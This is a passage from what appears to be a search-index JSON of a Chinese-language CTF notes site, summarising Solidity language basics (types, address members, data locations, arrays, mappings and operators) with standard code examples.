SimpleStorage {\n    uint storedData;\n}\n</code></pre></li> <li>\u5408\u7ea6\u5185\u5b9a\u4e49\u7684\u53d8\u91cf\uff08\u7c7b\u4f3c\u5c5e\u6027\uff09\u79f0\u4e3a\u72b6\u6001\u53d8\u91cf\uff08state variables\uff09\uff0c\u4f1a\u88ab\u5b58\u50a8\u5728\u533a\u5757\u94fe\u4e0a\u5408\u7ea6\u5bf9\u5e94\u7684\u5b58\u50a8\u533a\uff08storage\uff09\u4e2d</li> <li>\u5408\u7ea6\u5185\u5b9a\u4e49\u7684\u51fd\u6570\uff08\u7c7b\u4f3c\u65b9\u6cd5\uff09\u79f0\u4e3a\u51fd\u6570\uff08functions\uff09\uff0c\u4f1a\u88ab\u5b58\u50a8\u5728\u533a\u5757\u94fe\u4e0a\u5408\u7ea6\u5bf9\u5e94\u7684\u4ee3\u7801\u533a\uff08code\uff09\u4e2d     <pre><code>contract SimpleStorage {\n    uint storedData;\n    function set(uint x) public {\n        storedData = x;\n    }\n    function get() public view returns (uint) {\n        return storedData;\n    }\n}\n</code></pre><ul> <li>\u51fd\u6570\u4e5f\u53ef\u4ee5\u5b9a\u4e49\u5728\u5408\u7ea6\u5916\u9762\u4f5c\u4e3a\u5de5\u5177\u4f7f\u7528</li> </ul> </li> <li>\u5408\u7ea6\u4e2d\u8fd8\u53ef\u4ee5\u5b9a\u4e49\u4fee\u6539\u5668\uff08modifier\uff09\u3001\u4e8b\u4ef6\uff08event\uff09\u3001\u7ed3\u6784\u4f53\uff08struct\uff09\u3001\u679a\u4e3e\uff08enum\uff09\u7b49</li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_4","title":"\u7c7b\u578b","text":"<p>Solidity \u662f\u9759\u6001\u7c7b\u578b\u8bed\u8a00\uff0c\u4e14\u6ca1\u6709 undifined\u3001null \u7b49\u7a7a\u503c\u6982\u5ff5\uff0c\u53d6\u4ee3\u7684\u662f\u7c7b\u578b\u9ed8\u8ba4\u503c\u3002</p>"},{"location":"ctf/blockchain/eth/solidity/#_5","title":"\u57fa\u672c\u503c\u7c7b\u578b","text":"<ul> <li>\u5e03\u5c14\u7c7b\u578b<ul> <li>\u5c0f\u5199 true\u3001false</li> <li>||\u3001&amp;&amp;\u3001!\u3001==\u3001!= \u8fd0\u7b97\u7b26<ul> <li>|| \u548c &amp;&amp; \u6709\u77ed\u8def\u64cd\u4f5c</li> </ul> </li> </ul> </li> <li>\u6574\u578b<ul> <li>int \u548c uint \u8868\u793a\u6709\u7b26\u53f7\u548c\u65e0\u7b26\u53f7\u6574\u578b\uff0c\u9ed8\u8ba4 256 \u4f4d\uff0832 \u5b57\u8282\uff09</li> <li>\u5176\u5b83\u5927\u5c0f\u6709 uint8\u3001uint16 \u7b49\u7b49\uff08\u5747\u6307\u4f4d\u6570\uff09</li> <li>int \u8d1f\u6570\u901a\u8fc7\u8865\u7801\u5b58\u50a8</li> <li>\u8fd0\u7b97\u7b26\uff1a+\u3001-\u3001\u3001/\u3001%\u3001*\u3001&lt;&lt;\u3001&gt;&gt;\u3001&amp;\u3001|\u3001^\u3001~\u3001==\u3001!=\u3001&lt;\u3001&lt;=\u3001&gt;\u3001&gt;=<ul> <li>/ \u5411 0 \u820d\u5165</li> <li>** \u6307\u6570\u8fd0\u7b97\uff0c\u4e0d\u8fc7 x**3 \u8981\u6bd4 x*x*x \u6d88\u8017\u66f4\u591a gas</li> <li>0 ** 0 \u5b9a\u4e49\u4e3a 1</li> </ul> </li> <li>\u53ef\u4ee5\u901a\u8fc7 <code>type(uint).min</code> \u548c <code>type(uint).max</code> \u83b7\u53d6\u6700\u5927\u6700\u5c0f\u503c</li> <li>0.8.0 \u4ee5\u4e0a\u7248\u672c\u4f1a\u6709\u6ea2\u51fa\u68c0\u67e5<ul> <li>\u5b58\u5728\u6ea2\u51fa\u4f1a\u4ee5 assert \u5931\u8d25\u7684\u5f62\u5f0f revert \u8c03\u7528</li> <li>\u53ef\u4ee5\u901a\u8fc7 <code>unchecked { ... }</code> \u5757\u5173\u95ed\u6ea2\u51fa\u68c0\u67e5</li> </ul> </li> </ul> </li> <li>\u5730\u5740<ul> <li>address \u8868\u793a 20 \u5b57\u8282\u7684\u5730\u5740</li> <li>address payable \u8868\u793a\u53ef\u4ee5\u63a5\u6536\u4ee5\u592a\u5e01\u7684\u5730\u5740\uff0c\u591a\u4e86 transfer \u548c send \u65b9\u6cd5</li> <li>\u53ef\u4ee5\u4ece address payable \u5230 address \u9690\u5f0f\u8f6c\u6362\uff0c\u4e0d\u80fd\u4ece address \u5230 payable \u9690\u5f0f\u8f6c\u6362<ul> <li>\u53ef\u4ee5\u901a\u8fc7 payable() \u663e\u5f0f\u8f6c\u6362 <li>\u53ef\u4ee5\u5728\u5730\u5740\u548c uint160\u3001\u6574\u578b\u5b57\u9762\u91cf\u3001bytes20\u3001\u5408\u7ea6\u4e4b\u95f4\u663e\u5f0f\u8f6c\u6362</li> <li>\u5c06\u5408\u7ea6\u8f6c\u4e3a payable \u5730\u5740\u65f6\u8981\u6c42\u5408\u7ea6\u53ef\u4ee5\u63a5\u6536\u4ee5\u592a\u5e01\uff08\u6709 receive \u6216 fallback \u51fd\u6570\uff09<ul> <li>0 \u5730\u5740\u9664\u5916\uff0cpayable(0) \u662f\u5408\u6cd5\u7684</li> </ul> </li> <li>\u53ef\u4ee5\u4f7f\u7528\u6bd4\u8f83\u8fd0\u7b97\u7b26\u6bd4\u8f83\u5730\u5740</li> <li>\u4ece bytes32 \u8f6c\u5230 address \u4f1a\u622a\u65ad\uff08\u53d6\u5de6\u8fb9 20 \u5b57\u8282\uff09<ul> <li>0.4.24 \u5f00\u59cb\u8981\u6c42\u663e\u5f0f\u622a\u65ad\uff1a<code>address(uint160(bytes20(b32)))</code> \u6216 <code>address(uint160(uint256(b32)))</code></li> </ul> </li> <li>\u6210\u5458<ul> <li>balance\uff1a\u67e5\u8be2\u5730\u5740\u4f59\u989d\uff08wei \u4e3a\u5355\u4f4d\uff09</li> <li>transfer\uff1a\u5411\u5730\u5740\u8f6c\u8d26\uff0cx.transfer(10) \u8868\u793a\u4ece\u5f53\u524d\u5730\u5740\u5411 x \u8f6c 10 wei\uff0c\u5931\u8d25\u4f1a revert</li> <li>send\uff1a\u5411\u5730\u5740\u8f6c\u8d26\uff0c\u7c7b\u4f3c transfer \u4e0d\u8fc7\u5931\u8d25\u4f1a\u8fd4\u56de false</li> <li>call\u3001delegatecall\u3001staticcall\uff1a\u8fdc\u7a0b\u8c03\u7528     <pre><code>bytes memory payload = abi.encodeWithSignature(\"register(string)\", \"MyName\");\n(bool success, bytes memory returnData) = address(nameReg).call(payload);\nrequire(success);\n</code></pre><ul> <li>payload \u662f bytes memory\uff0c\u53ef\u4ee5\u4f7f\u7528 abi.encodeWithSignature \u751f\u6210</li> <li>\u53ef\u4ee5\u901a\u8fc7 modifier \u6307\u5b9a gas \u548c value     <pre><code>address(nameReg).call{gas: 20000, value: 1 ether}(payload);\n</code></pre><ul> <li>\u53ea\u6709 call \u652f\u6301 value</li> </ul> </li> </ul> </li> <li>code\uff1a\u83b7\u53d6\u5730\u5740\u4e0a\u7684\u5408\u7ea6\uff0c\u8fd4\u56de bytes memory\uff0c\u4e14\u53ef\u80fd\u4e3a\u7a7a</li> <li>codehash\uff1a\u83b7\u53d6\u5730\u5740\u4e0a\u5408\u7ea6\u7684 keccak256 \u54c8\u5e0c\uff0caddr.codehash \u6bd4 keccak256(addr.code) \u6d88\u8017\u66f4\u5c11 gas</li> </ul> </li> <li>\u5e26\u5927\u5c0f\u5199\u6821\u9a8c\u7684 20 \u5b57\u8282\u5341\u516d\u8fdb\u5236\u5b57\u9762\u91cf\u662f\u5730\u5740\uff08\u4e0d\u5e26\u6821\u9a8c\u4f1a\u4ea7\u751f\u9519\u8bef\uff09</li> <li>\u5408\u7ea6\u7c7b\u578b<ul> <li>\u6bcf\u4e2a\u5408\u7ea6\u90fd\u76f8\u5f53\u4e8e\u4e00\u4e2a\u65b0\u7c7b\u578b</li> <li>\u53ef\u4ee5\u663e\u5f0f\u4e0e address \u8f6c\u6362</li> <li>\u5408\u7ea6\u7684\u6210\u5458\u662f\u6240\u6709\u5916\u90e8\u51fd\u6570\uff08external\u3001public\uff09\u4ee5\u53ca\u6807\u8bb0\u4e3a public \u7684\u72b6\u6001\u53d8\u91cf</li> </ul> </li> <li>\u5b9a\u957f\u5b57\u8282\u6570\u7ec4<ul> <li>bytes1\u3001bytes2\u3001bytes3\u2026\u2026bytes32</li> <li>\u8fd0\u7b97\u7b26\uff1a==\u3001!=\u3001&lt;\u3001&lt;=\u3001&gt;\u3001&gt;=\u3001&amp;\u3001|\u3001^\u3001~\u3001&lt;&lt;\u3001&gt;&gt;\u3001[]</li> <li>.length \u8bbf\u95ee\u5b57\u8282\u6570\u7ec4\u957f\u5ea6\uff08\u53ea\u8bfb\uff09</li> <li>bytes\u3001string \u662f\u53d8\u957f\u5b57\u8282\u6570\u7ec4\uff0c\u4e0d\u5c5e\u4e8e\u503c\u7c7b\u578b\uff0c\u5728\u4e0b\u9762\u518d\u8bf4</li> <li>\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a\u8fd9\u4e9b bytesn \u7c7b\u578b<ul> <li>\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\u53ef\u4ee5\u4f7f\u7528\u5355\u5f15\u53f7\u6216\u53cc\u5f15\u53f7</li> <li>\\xNN \u8f6c\u4e49\u5341\u516d\u8fdb\u5236\uff0c\\uNNNN \u8f6c\u4e49 Unicode\uff08\u5230 UTF-8\uff09</li> <li>\u5199\u5728\u5b57\u9762\u91cf\u91cc\u7684\u5b57\u7b26\u5fc5\u987b\u662f ASCII \u5b57\u7b26</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>hex\"...\"</code> \u5b57\u9762\u91cf\u8868\u793a\u5341\u516d\u8fdb\u5236\u5b57\u8282\u6570\u7ec4</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>unicode\"...\"</code> \u76f4\u63a5\u5728\u5185\u90e8\u5199 Unicode \u5b57\u7b26</li> </ul> </li> </ul> </li> <li>\u679a\u4e3e\u7c7b\u578b     <pre><code>enum ActionChoices { GoLeft, GoRight, GoStraight, SitStill }\n</code></pre><ul> <li>\u81f3\u5c11\u6709\u4e00\u4e2a\u6210\u5458\uff0c\u4e14\u9ed8\u8ba4\u4e3a\u7b2c\u4e00\u4e2a\u6210\u5458</li> <li>\u4e0d\u80fd\u8d85\u8fc7 256 \u4e2a\u6210\u5458</li> <li>\u53ef\u4ee5\u4e0e\u6574\u578b\u663e\u5f0f\u8f6c\u6362\uff08\u4ece 0 \u5f00\u59cb\uff09</li> <li>\u53ef\u4ee5\u4f7f\u7528 <code>ActionChoices.GoStraight</code> \u8bbf\u95ee\u6210\u5458</li> </ul> </li> <li>\u7528\u6237\u81ea\u5b9a\u4e49\u503c\u7c7b\u578b     <pre><code>type UFixed256x18 is uint256;\n</code></pre><ul> <li>\u7136\u540e\u53ef\u4ee5\u4f7f\u7528 library \u4e3a\u5176\u6dfb\u52a0\u65b9\u6cd5</li> </ul> </li> <li>\u51fd\u6570\u7c7b\u578b     <pre><code>function (&lt;parameter types&gt;) {internal|external} [pure|view|payable] [returns (&lt;return types&gt;)]\n</code></pre><ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u662f internal\uff0c\u53ef\u4ee5\u7701\u7565<ul> <li>\u4f46\u4ec5\u9650\u8868\u793a\u51fd\u6570\u7c7b\u578b\u7684\u65f6\u5019\uff0c\u5408\u7ea6\u51fd\u6570\u5b9a\u4e49\u65f6\u4e0d\u53ef\u4ee5\u7701\u7565\u53ef\u89c1\u6027</li> </ul> </li> <li>pure \u51fd\u6570\u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a view \u548c non-payable</li> <li>view\u3001payable \u53ef\u4ee5\u9690\u5f0f\u8f6c\u6362\u4e3a non-payable</li> <li>\u5f53\u524d\u5408\u7ea6\u5185\u7684 public \u51fd\u6570\u540c\u65f6\u662f internal \u548c external \u7684\uff0cf \u8868\u793a internal \u5f62\u5f0f\uff0cthis.f \u8868\u793a external \u5f62\u5f0f</li> <li>\u6210\u5458<ul> <li>address\uff1a\u51fd\u6570\u6240\u5728\u5408\u7ea6\u7684\u5730\u5740</li> <li>selector\uff1a\u5f53\u524d\u51fd\u6570\u7684\u9009\u62e9\u5b50</li> <li>0.7.0 \u4e4b\u524d\u8fd8\u6709 .gas(uint) \u548c .value(uint) \u7528\u6765\u5236\u5b9a\u8c03\u7528\u65f6\u7684 gas \u548c value\uff0c\u4e4b\u540e\u5220\u9664\u4e86\uff0c\u9700\u8981\u4f7f\u7528 {gas: ..., value: ...}</li> </ul> </li> <li> <p>\u4f8b\u5b50</p> Example <pre><code>// SPDX-License-Identifier: GPL-3.0\npragma solidity &gt;=0.4.22 &lt;0.9.0;\n\n\ncontract Oracle {\n    struct Request {\n        bytes data;\n        function(uint) external callback;\n    }\n\n    Request[] private requests;\n    event NewRequest(uint);\n\n    function query(bytes memory data, function(uint) external callback) public {\n        requests.push(Request(data, callback));\n        emit NewRequest(requests.length - 1);\n    }\n\n    function reply(uint requestID, uint response) public {\n        // Here goes the check that the reply comes from a trusted source\n        requests[requestID].callback(response);\n    }\n}\n\n\ncontract OracleUser {\n    Oracle constant private ORACLE_CONST = Oracle(address(0x00000000219ab540356cBB839Cbe05303d7705Fa)); // known contract\n    uint private exchangeRate;\n\n    function buySomething() public {\n        ORACLE_CONST.query(\"USD\", this.oracleResponse);\n    }\n\n    function oracleResponse(uint response) public {\n        require(\n            msg.sender == address(ORACLE_CONST),\n            \"Only oracle can call this.\"\n        );\n        exchangeRate = response;\n    }\n}\n</code></pre> </li> </ul> </li>"},{"location":"ctf/blockchain/eth/solidity/#_6","title":"\u5f15\u7528\u7c7b\u578b","text":"<ul> <li>\u5f15\u7528\u7c7b\u578b\u53ef\u4ee5\u4f7f\u4e00\u4e2a\u503c\u901a\u8fc7\u4e0d\u540c\u540d\u79f0\u88ab\u4fee\u6539<ul> <li>\u800c\u503c\u7c7b\u578b\u5728\u4f7f\u7528\u7684\u65f6\u5019\u4f1a\u590d\u5236\u4e00\u4efd</li> </ul> </li> <li>\u6570\u636e\u4f4d\u7f6e\uff08data location\uff09<ul> <li>\u6bcf\u4e2a\u5f15\u7528\u7c7b\u578b\u90fd\u9700\u8981\u9644\u52a0\u4e00\u4e2a\u6570\u636e\u4f4d\u7f6e\uff0c\u8868\u793a\u6570\u636e\u5728\u54ea\u91cc\u5b58\u50a8</li> <li>\u4e09\u79cd\u4f4d\u7f6e\uff1a<ul> <li>memory\uff1a\u5728 memory \u4e2d\u5b58\u50a8\uff0c\u751f\u547d\u5468\u671f\u53ea\u5728\u5f53\u524d\u8c03\u7528\u4e2d</li> <li>storage\uff1a\u72b6\u6001\u53d8\u91cf\u533a\uff0c\u751f\u547d\u5468\u671f\u548c\u5408\u7ea6\u76f8\u540c</li> <li>calldata\uff1a\u53ea\u5728\u51fd\u6570\u4e2d\uff0c\u4e14\u4e0d\u53ef\u4fee\u6539\uff0c\u53ef\u4ece\u51fd\u6570\u8fd4\u56de\uff0c\u5e94\u4f18\u5148\u8003\u8651\u4f7f\u7528\u8fd9\u79cd</li> <li>0.6.9 \u4e4b\u524d\u9650\u5236\u53ea\u80fd\u5728 external \u51fd\u6570\u4e2d\u4f7f\u7528 calldata\uff0c\u4e4b\u540e\u6ca1\u6709\u9650\u5236</li> <li>0.5.0 \u4e4b\u524d\u53ef\u4ee5\u7701\u7565\uff0c\u4e4b\u540e\u5fc5\u987b\u6307\u5b9a</li> </ul> </li> <li>\u8d4b\u503c\u884c\u4e3a\uff1a<ul> <li>\u5728 storage \u548c memory \u4e4b\u95f4\u8d4b\u503c\uff08\u6216\u4ece calldata \u8d4b\u503c\uff09\u59cb\u7ec8\u4f1a\u521b\u5efa\u4e00\u4efd\u72ec\u7acb\u7684\u62f7\u8d1d</li> <li>\u5728 memory \u548c memory \u4e4b\u95f4\u8d4b\u503c\u4ec5\u521b\u5efa\u5f15\u7528</li> <li>\u4ece storage \u8d4b\u503c\u7ed9\u5c40\u90e8\u7684 storage \u53d8\u91cf\u4f1a\u4ec5\u521b\u5efa\u5f15\u7528</li> <li>\u5176\u5b83\u60c5\u51b5\u4e0b\u8d4b\u503c\u7ed9 storage \u59cb\u7ec8\u8fdb\u884c\u62f7\u8d1d <pre><code>contract C {\n    uint[] x; // storage \u5b58\u50a8\uff0c\u53ea\u6709\u6b64\u65f6\u53ef\u4ee5\u7701\u7565\u4f4d\u7f6e\n\n    function f(uint[] memory memoryArray) public {\n        x = memoryArray; // memory -&gt; storage\uff0c\u62f7\u8d1d\u6574\u4e2a\u6570\u7ec4\n        uint[] storage y = x; // storage -&gt; local storage\uff0c\u5f15\u7528\n        y[7]; // \u53ef\u4ee5\u5f97\u5230\u7b2c 8 \u4e2a\u5143\u7d20\n        y.pop(); // \u4fee\u6539\u4e86 y\uff0c\u540c\u65f6 x \u4e5f\u4f1a\u88ab\u66f4\u6539\n        delete x; // \u6e05\u7406\u4e86\u6570\u7ec4 x\uff0c\u540c\u65f6\u4e5f\u4f1a\u6e05\u7406 y\n        g(x); // \u8c03\u7528 g\uff0c\u53c2\u6570\u4e3a storage -&gt; local storage\uff0c\u5f15\u7528\n        h(x); // \u8c03\u7528 h\uff0c\u53c2\u6570\u4e3a storage -&gt; memory\uff0c\u62f7\u8d1d\n    }\n\n    function g(uint[] storage) internal pure {}\n    function h(uint[] memory) public pure {}\n}\n</code></pre></li> </ul> </li> </ul> </li> <li>\u6570\u7ec4<ul> <li>\u5728\u7f16\u8bd1\u671f\u53ef\u4ee5\u662f\u5b9a\u957f\u7684\u4e5f\u53ef\u4ee5\u662f\u53d8\u957f\u7684</li> <li>T \u7c7b\u578b\u7684\u5b9a\u957f\uff08\u957f\u5ea6\u4e3a k\uff09\u6570\u7ec4\u7c7b\u578b\u4e3a T[k]\uff0c\u53d8\u957f\u7c7b\u578b\u4e3a T[]</li> <li>\u4e0e\u5176\u5b83\u8bed\u8a00\u4e0d\u540c\u7684\u662f\uff0c\u4f8b\u5982 uint[][5] \u8868\u793a\u7684\u662f\u6709 5 \u4e2a\u5143\u7d20\u7684\u5b9a\u957f\u6570\u7ec4\uff08\u6570\u7ec4\u4e2d\u5143\u7d20\u662f uint[] \u7c7b\u578b\uff09</li> <li>\u5c06\u6570\u7ec4\u7c7b\u578b\u7684\u72b6\u6001\u53d8\u91cf\u6807\u8bb0\u4e3a public \u7684\u8bdd\u4f1a\u521b\u5efa\u4e00\u4e2a getter \u51fd\u6570\uff0c\u8f93\u5165\u4e3a\u7d22\u5f15</li> <li>\u8d8a\u754c\u8bbf\u95ee\u4f1a\u5bfc\u81f4 assert \u9519\u8bef</li> <li>\u53ef\u4ee5\u4f7f\u7528 .push() \u548c .push(value) \u6765\u5728\u52a8\u6001\u5927\u5c0f\u6570\u7ec4\u672b\u5c3e\u8ffd\u52a0\u65b0\u5143\u7d20<ul> <li>.push() \u8ffd\u52a0\u9ed8\u8ba4\u503c\u5e76\u8fd4\u56de\u5f15\u7528</li> </ul> </li> <li>\u52a8\u6001\u5927\u5c0f\u6570\u7ec4\u53ea\u80fd\u5728 storage \u4e2d\u8c03\u6574\u5927\u5c0f\uff0c\u5728 memory \u4e2d\u4e00\u65e6\u5206\u914d\u4fbf\u4e0d\u80fd\u4fee\u6539\u5927\u5c0f</li> <li>\u6570\u7ec4\u5b57\u9762\u91cf\u548c\u5176\u5b83\u8bed\u8a00\u4e00\u6837\u662f [..., ..., ...]\uff0c\u59cb\u7ec8\u662f\u56fa\u5b9a\u957f\u5ea6\u7684</li> <li>\u4e0d\u80fd\u5c06\u56fa\u5b9a\u957f\u5ea6\u7684\u6570\u7ec4\u8d4b\u503c\u7ed9\u52a8\u6001\u5927\u5c0f\u7684\u6570\u7ec4\uff08\u9700\u8981\u9010\u5143\u7d20\u8d4b\u503c\uff09</li> <li>\u6210\u5458\uff1a<ul> <li>length\uff1a\u957f\u5ea6</li> <li>push()\uff1a\u6dfb\u52a0\u4e00\u4e2a 0 \u5143\u7d20\uff0c\u8fd4\u56de\u5f15\u7528\uff08string \u4e0d\u53ef\u7528\uff09     <pre><code>x.push().t = 2\nx.push() = b\n</code></pre></li> <li>push(x)\uff1a\u672b\u5c3e\u8ffd\u52a0\u5143\u7d20\uff0c\u4ec0\u4e48\u90fd\u4e0d\u8fd4\u56de\uff08string \u4e0d\u53ef\u7528\uff09</li> <li>pop()\uff1a\u672b\u5c3e\u5220\u9664\u4e00\u4e2a\u5143\u7d20\uff0c\u4ec0\u4e48\u90fd\u4e0d\u8fd4\u56de\uff08string \u4e0d\u53ef\u7528\uff09</li> </ul> </li> <li>\u5728\u5d4c\u5957\u6570\u7ec4\u4e2d\u8981\u65f6\u523b\u6ce8\u610f\u907f\u514d\u60ac\u5782\u5f15\u7528\uff08\u56e0\u4e3a\u6ca1\u6709\u9488\u5bf9\u5355\u4e2a\u503c\u7684\u5f15\u7528\uff0c\u6240\u4ee5\u4e00\u7ef4\u6570\u7ec4\u4e0d\u4f1a\u51fa\u73b0\u60ac\u5782\u5f15\u7528\u7684\u60c5\u51b5\uff09</li> <li>\u53ef\u4ee5\u4f7f\u7528\u5207\u7247\uff0c\u8bed\u6cd5\u7c7b\u4f3c python\uff08\u6ca1\u6709 step\uff09<ul> <li>\u6ca1\u6709\u7c7b\u578b\u540d\u79f0\uff0c\u53ea\u53ef\u4ee5\u5728\u4e2d\u95f4\u8868\u8fbe\u5f0f\u4e2d\u4f7f\u7528</li> <li>\u76ee\u524d\u53ea\u6709 calldata \u6570\u7ec4\u5b9e\u73b0\u4e86\u5207\u7247</li> </ul> </li> </ul> </li> <li>\u5b57\u8282\u6570\u7ec4\u548c\u5b57\u7b26\u4e32<ul> <li>bytes \u7c7b\u4f3c bytes1[]\uff0c\u4e0d\u8fc7\u5728 calldata \u548c memory \u4e2d\u662f\u7d27\u5bc6\u6253\u5305\u7684<ul> <li>storage \u4e2d bytes1[] \u4e5f\u662f\u7d27\u5bc6\u6253\u5305</li> <li>calldata \u548c memory \u4e2d bytes1[] \u4f1a\u6709 31 \u5b57\u8282\u7684\u586b\u5145</li> <li>\u4f7f\u7528 bytes \u6bd4 bytes1[] \u66f4\u4fbf\u5b9c</li> <li>\u5982\u679c\u957f\u5ea6\u6709\u9650\u5236\uff0c\u5219\u4f7f\u7528 bytes1\u2026\u2026bytes32 \u6bd4 bytes \u66f4\u4fbf\u5b9c</li> </ul> </li> <li>string \u7b49\u4ef7\u4e8e bytes\uff0c\u4e0d\u8fc7\u4e0d\u5141\u8bb8\u8bbf\u95ee\u7d22\u5f15</li> <li>bytes \u5b58\u50a8\u4efb\u610f\u957f\u5ea6\u539f\u59cb\u5b57\u8282\u6d41\uff0cstring \u5b58\u50a8\u4efb\u610f\u957f\u5ea6 UTF-8 \u5b57\u7b26\u4e32\u6570\u636e</li> <li>string.concat \u548c bytes.concat \u53ef\u4ee5\u5206\u522b\u7528\u4e8e string \u548c concat \u7684\u8fde\u63a5\uff0c\u8fd4\u56de\u503c\u662f memory \u7684</li> <li>\u53ef\u4ee5\u901a\u8fc7 new \u6765\u5728 memory \u4e0a\u5206\u914d\u6570\u7ec4\uff0c\u4e0d\u8fc7\u957f\u5ea6\u56fa\u5b9a\uff1a     <pre><code>uint[] memory a = new uint[](7);\nbytes memory b = new bytes(8);\n</code></pre></li> </ul> </li> <li>\u7ed3\u6784\u4f53     <pre><code>struct Campaign {\n    address payable beneficiary;\n    uint fundingGoal;\n    uint numFunders;\n    uint amount;\n    mapping (uint =&gt; Funder) funders;\n}\n</code></pre><ul> <li>\u53ef\u4ee5\u5305\u542b\u6620\u5c04\u3001\u6570\u7ec4\u7b49\uff0c\u53ef\u4ee5\u5d4c\u5957\uff0c\u4f46\u662f\u4e0d\u80fd\u5305\u542b\u81ea\u8eab\u7c7b\u578b</li> <li>\u901a\u8fc7 . \u6765\u8bbf\u95ee\u5185\u90e8\u6210\u5458</li> </ul> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_7","title":"\u6620\u5c04\u7c7b\u578b","text":"<ul> <li>\u5b9a\u4e49\uff1a     <pre><code>mapping(KeyType =&gt; ValueType) VariableName\n</code></pre><ul> <li>KeyType \u53ef\u4ee5\u662f\u5185\u7f6e\u503c\u53d8\u91cf\uff1abytes\u3001string\u3001address\u3001enum \u7b49<ul> <li>\u4e0d\u80fd\u662f\u7528\u6237\u5b9a\u4e49\u7684\u548c\u590d\u6742\u7c7b\u578b\uff1amappings\u3001structs\u3001\u6570\u7ec4\u7b49</li> </ul> </li> <li>ValueType \u53ef\u4ee5\u662f\u4efb\u4f55\u7c7b\u578b</li> </ul> </li> <li>\u4e0d\u4f1a\u5b58\u50a8\u952e\uff0c\u4f1a\u5c06\u952e\u5bf9\u5e94\u503c\u5b58\u50a8\u5728 slot keccak256(key) \u4e2d\uff08\u54c8\u5e0c\u8868\uff09<ul> <li>\u56e0\u6b64\u6ca1\u6709\u957f\u5ea6\u6982\u5ff5</li> <li>\u4ee5\u53ca\u5982\u679c\u4e0d\u8bb0\u5f55\u989d\u5916\u4fe1\u606f\u7684\u8bdd\uff0c\u65e0\u6cd5\u5b8c\u5168\u64e6\u9664\u4e00\u4e2a\u6620\u5c04</li> </ul> </li> <li>\u6620\u5c04\u53ea\u80fd\u5b58\u50a8\u5728 storage \u4e2d\u4f5c\u4e3a\u72b6\u6001\u53d8\u91cf</li> <li>\u6807\u8bb0\u4e3a public \u7684\u8bdd\uff0c\u4f1a\u521b\u5efa\u4e00\u4e2a getter\uff0c\u8f93\u5165\u4e3a\u952e\uff0c\u8fd4\u56de\u4e3a\u503c</li> <li> <p>Iterable Mapping</p> <ul> <li>\u53ef\u4ee5\u8bb0\u5f55\u989d\u5916\u4fe1\u606f\uff0c\u679a\u4e3e\u952e</li> </ul> implementation <pre><code>// SPDX-License-Identifier: GPL-3.0\npragma solidity ^0.8.8;\n\nstruct IndexValue { uint keyIndex; uint value; }\nstruct KeyFlag { uint key; bool deleted; }\n\nstruct itmap {\n    mapping(uint =&gt; IndexValue) data;\n    KeyFlag[] keys;\n    uint size;\n}\n\ntype Iterator is uint;\n\nlibrary IterableMapping {\n    function insert(itmap storage self, uint key, uint value) internal returns (bool replaced) {\n        uint keyIndex = self.data[key].keyIndex;\n        self.data[key].value = value;\n        if (keyIndex &gt; 0)\n            return true;\n        else {\n            keyIndex = self.keys.length;\n            self.keys.push();\n            self.data[key].keyIndex = keyIndex + 1;\n            self.keys[keyIndex].key = key;\n            self.size++;\n            return false;\n        }\n    }\n\n    function remove(itmap storage self, uint key) internal returns (bool success) {\n        uint keyIndex = self.data[key].keyIndex;\n        if (keyIndex == 0)\n            return false;\n        delete self.data[key];\n        self.keys[keyIndex - 1].deleted = true;\n        self.size --;\n    }\n\n    function contains(itmap storage self, uint key) internal view returns (bool) {\n        return self.data[key].keyIndex &gt; 0;\n    }\n\n    function iterateStart(itmap storage self) internal view returns (Iterator) {\n        return iteratorSkipDeleted(self, 0);\n    }\n\n    function iterateValid(itmap storage self, Iterator iterator) internal view returns (bool) {\n        return Iterator.unwrap(iterator) &lt; self.keys.length;\n    }\n\n    function iterateNext(itmap storage self, Iterator iterator) internal view returns (Iterator) {\n        return iteratorSkipDeleted(self, Iterator.unwrap(iterator) + 1);\n    }\n\n    function iterateGet(itmap storage self, Iterator iterator) internal view returns (uint key, uint value) {\n        uint keyIndex = Iterator.unwrap(iterator);\n        key = self.keys[keyIndex].key;\n        value = self.data[key].value;\n    }\n\n    function iteratorSkipDeleted(itmap storage self, uint keyIndex) private view returns (Iterator) {\n        while (keyIndex &lt; self.keys.length &amp;&amp; self.keys[keyIndex].deleted)\n            keyIndex++;\n        return Iterator.wrap(keyIndex);\n    }\n}\n\n// How to use it\ncontract User {\n    // Just a struct holding our data.\n    itmap data;\n    // Apply library functions to the data type.\n    using IterableMapping for itmap;\n\n    // Insert something\n    function insert(uint k, uint v) public returns (uint size) {\n        // This calls IterableMapping.insert(data, k, v)\n        data.insert(k, v);\n        // We can still access members of the struct,\n        // but we should take care not to mess with them.\n        return data.size;\n    }\n\n    // Computes the sum of all stored data.\n    function sum() public view returns (uint s) {\n        for (\n            Iterator i = data.iterateStart();\n            data.iterateValid(i);\n            i = data.iterateNext(i)\n        ) {\n            (, uint value) = data.iterateGet(i);\n            s += value;\n        }\n    }\n}\n</code></pre> </li> </ul>"},{"location":"ctf/blockchain/eth/solidity/#_8","title":"\u8fd0\u7b97\u7b26","text":"<p>\u524d\u9762\u6709\u63d0\u5230\u8fc7\uff0c\u4e0b\u9762\u662f\u4e00\u4e9b\u8865\u5145</p> <ul> <li>\u4e09\u76ee\u8fd0\u7b97\u7b26\uff1a     <pre><code>&lt;expression&gt; ? &lt;trueExpression&gt; : &lt;falseExpression&gt;\n</code></pre></li> <li>\u590d\u5408\u8fd0\u7b97\u7b26\u3001\u81ea\u589e/\u81ea\u51cf\u7b49<ul> <li>\u53ef\u4ee5\u4f7f\u7528 -= *= /= %= |= &amp;= ^= &lt;&lt;= &gt;&gt;= \u7b49</li> <li>a++ a-- --a ++a \u610f\u4e49\u4e5f\u548c C \u4e2d\u76f8\u540c</li> </ul> </li> <li>delete<ul> <li>delete a \u4f1a\u5c06\u8be5\u7c7b\u578b\u7684\u521d\u59cb\u503c\u8d4b\u503c\u7ed9 a</li> <li>\u53ef\u4ee5\u4f5c\u7528\u4e0e\u6570\u7ec4\u4e0a</li> 